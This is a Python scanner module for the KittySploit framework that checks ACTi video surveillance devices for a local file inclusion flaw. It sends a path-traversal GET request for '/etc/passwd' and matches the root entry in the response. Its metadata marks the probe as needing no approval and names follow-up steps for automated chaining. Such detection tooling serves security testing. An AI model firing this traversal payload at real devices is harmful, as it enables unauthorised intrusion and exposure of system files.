#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ACTI video surveillance has loopholes in reading any files."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ACTi-Video Monitoring - Local File Inclusion Detection',
        'description': 'ACTI video surveillance has loopholes in reading any files',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'acti', 'lfi', 'iot', 'video', 'monitoring', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.cnblogs.com/hmesed/p/16292252.html'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/images/../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="ACTi-Video Monitoring - Local File Inclusion detected",
                path='/images/../../../../../../../../etc/passwd',
            )
            return True
        return False

